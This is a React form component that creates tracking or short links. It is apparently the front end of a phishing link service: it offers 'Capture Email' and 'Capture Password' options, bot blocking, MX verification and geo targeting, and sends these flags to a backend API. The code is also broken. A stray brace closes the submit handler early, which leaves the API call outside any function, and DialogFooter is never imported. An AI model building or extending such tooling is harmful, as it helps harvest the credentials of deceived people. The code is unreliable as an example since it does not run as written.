import React, { useState } from 'react';
import { Input } from '../ui/input';
import { Label } from '../ui/label';
import { Button } from '../ui/button';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../ui/select';
import { Checkbox } from '../ui/checkbox';
import { toast } from 'sonner';
import api from '../../services/api'; // Assuming api service is available at this path

const CreateLinkForm = ({ onClose, onLinkCreated, type = 'tracking' }) => {
  // The new project's form is a component, the old one was a modal. 
  // We'll merge the fields from the old modal into the new form's state.
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    targetUrl: '',
    previewUrl: '',
    campaignName: '',
    customCode: '', // Added for shortener functionality
    // Security Features (from old project's TrackingLinks.jsx state)
    botBlockingEnabled: true,
    rateLimitingEnabled: false,
    dynamicSignatureEnabled: false,
    mxVerificationEnabled: false,
    geoTargetingEnabled: false,
    // Capture Options (from old project's TrackingLinks.jsx state)
    captureEmail: false,
    capturePassword: false,
    // Expiration (from old project's TrackingLinks.jsx state)
    expirationPeriod: 'never', // 'never', '1_hour', '1_day', '1_week', etc.
    // The old project's CreateLinkModal.jsx had a lot more fields like customCode, password, domain, etc.
    // For now, we'll stick to the fields visible in the user's image (IMG_5364.png) and the core tracking features.
    // The new form already has targetUrl, previewUrl, campaignName.
  });

  const handleChange = (e) => {
    const { id, value } = e.target;
    setFormData(prev => ({ ...prev, [id]: value }));
  };

  const handleCheckboxChange = (id, checked) => {
    setFormData(prev => ({ ...prev, [id]: checked }));
  };

  const handleSelectChange = (value) => {
    setFormData(prev => ({ ...prev, expirationPeriod: value }));
  };

   const handleSubmit = async (e) => {
    e.preventDefault();
    if (!formData.targetUrl) {
      toast.error('Target URL is required.');
      return;
	    }
	    if (type === 'tracking' && !formData.campaignName) {
	      toast.error('Campaign Name is required for a tracking link.');
	      return;
	    }
	  };

    setLoading(true);
    try {
      const payload = {
        target_url: formData.targetUrl,
        preview_url: formData.previewUrl || undefined,
        campaign_name: formData.campaignName || undefined,
        short_code: formData.customCode || undefined, // Added for shortener
        capture_email: formData.captureEmail,
        capture_password: formData.capturePassword,
        bot_blocking_enabled: formData.botBlockingEnabled,
        rate_limiting_enabled: formData.rateLimitingEnabled,
        dynamic_signature_enabled: formData.dynamicSignatureEnabled,
        mx_verification_enabled: formData.mxVerificationEnabled,
        geo_targeting_enabled: formData.geoTargetingEnabled,
        expiration_period: formData.expirationPeriod,
        // Note: The old project had more complex geo-targeting fields (allowed_countries, etc.)
        // which are not in the current form. We'll rely on the backend to handle defaults 
        // or for a future phase to add the full complexity if required.
      };

      // Determine API endpoint based on type
      const apiPath = type === 'tracking' ? '/links' : '/shorten'; // Assuming /shorten for shortener
      const response = await api.post(apiPath, payload); 
      
      if (response.success) {
        toast.success('Link created successfully!');
        // Reset form and close modal
        setFormData({
          targetUrl: '',
          previewUrl: '',
          campaignName: '',
          customCode: '',
          botBlockingEnabled: true,
          rateLimitingEnabled: false,
          dynamicSignatureEnabled: false,
          mxVerificationEnabled: false,
          geoTargetingEnabled: false,
          captureEmail: false,
          capturePassword: false,
          expirationPeriod: 'never',
        });
        onLinkCreated();
        onClose();
      } else {
        toast.error(response.error || 'Failed to create link.');
      }
    } catch (error) {
      console.error('Error creating link:', error);
      toast.error('An unexpected error occurred while creating the link.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {/* Target URL */}
      <div>
        <Label htmlFor="targetUrl" className="text-foreground">Target URL *</Label>
        <Input
          id="targetUrl"
          type="url"
          placeholder="https://example.com"
          value={formData.targetUrl}
          onChange={handleChange}
          required
        />
      </div>

	      {/* Preview URL */}
	      <div>
	        <Label htmlFor="previewUrl" className="text-foreground">Preview URL (Optional)</Label>
	        <Input
	          id="previewUrl"
	          type="url"
	          placeholder="https://preview.example.com"
	          value={formData.previewUrl}
	          onChange={handleChange}
	        />
	      </div>
	      
	      {/* Custom Short Code (for shortener/tracking) */}
	      <div>
	        <Label htmlFor="customCode" className="text-foreground">Custom Short Code (Optional)</Label>
	        <Input
	          id="customCode"
	          type="text"
	          placeholder="e.g., my-short-link"
	          value={formData.customCode}
	          onChange={handleChange}
	        />
	      </div>

	      {/* Campaign Name */}
	      <div>
	        <Label htmlFor="campaignName" className="text-foreground">Campaign Name {type === 'tracking' ? '*' : '(Optional)'}</Label>
	        <Input
	          id="campaignName"
	          type="text"
	          placeholder="My New Campaign"
	          value={formData.campaignName}
	          onChange={handleChange}
	          required={type === 'tracking'}
	        />
	      </div>

	      {/* Link Expiration */}
	      <div>
	        <Label htmlFor="expirationPeriod" className="text-foreground">Link Expiration (Optional)</Label>
	        <Select value={formData.expirationPeriod} onValueChange={handleSelectChange}>
	          <SelectTrigger id="expirationPeriod">
	            <SelectValue placeholder="Select expiration" />
	          </SelectTrigger>
	          <SelectContent>
	            <SelectItem value="never">Never Expires</SelectItem>
	            <SelectItem value="1_hour">1 Hour</SelectItem>
	            <SelectItem value="1_day">1 Day</SelectItem>
	            <SelectItem value="1_week">1 Week</SelectItem>
	            <SelectItem value="1_month">1 Month</SelectItem>
	            <SelectItem value="custom">Custom Date</SelectItem>
	          </SelectContent>
	        </Select>
	      </div>

	      {/* Security Features (Matching IMG_5364.png) */}
	      <div className="pt-2">
	        <h3 className="text-lg font-semibold text-foreground">Security Features</h3>
	        <div className="space-y-2 mt-2">
	          {[
	            { id: 'botBlockingEnabled', label: 'Bot Blocking' },
	            { id: 'rateLimitingEnabled', label: 'Rate Limiting' },
	            { id: 'dynamicSignatureEnabled', label: 'Dynamic Signature' },
	            { id: 'mxVerificationEnabled', label: 'MX Verification' },
	            { id: 'geoTargetingEnabled', label: 'Geo Targeting' },
	          ].map(feature => (
	            <div key={feature.id} className="flex items-center justify-between">
	              <Label htmlFor={feature.id} className="text-muted-foreground">
	                {feature.label}
	              </Label>
	              <Checkbox
	                id={feature.id}
	                checked={formData[feature.id]}
	                onCheckedChange={(checked) => handleCheckboxChange(feature.id, checked)}
	              />
	            </div>
	          ))}
	        </div>
	      </div>

	      {/* Capture Options (Matching IMG_5364.png) */}
	      <div className="pt-2">
	        <h3 className="text-lg font-semibold text-foreground">Capture Options</h3>
	        <div className="space-y-2 mt-2">
	          {[
	            { id: 'captureEmail', label: 'Capture Email' },
	            { id: 'capturePassword', label: 'Capture Password' },
	          ].map(option => (
	            <div key={option.id} className="flex items-center justify-between">
	              <Label htmlFor={option.id} className="text-muted-foreground">
	                {option.label}
	              </Label>
	              <Checkbox
	                id={option.id}
	                checked={formData[option.id]}
	                onCheckedChange={(checked) => handleCheckboxChange(option.id, checked)}
	              />
	            </div>
	          ))}
	        </div>
	      </div>

	      <DialogFooter className="pt-4">
	        <Button type="button" variant="outline" onClick={onClose} disabled={loading}>Cancel</Button>
	        <Button type="submit" disabled={loading}>
	          {loading ? 'Creating...' : `Create ${type === 'tracking' ? 'Tracking' : 'Short'} Link`}
	        </Button>
	      </DialogFooter>
    </form>
  );
};

export default CreateLinkForm;
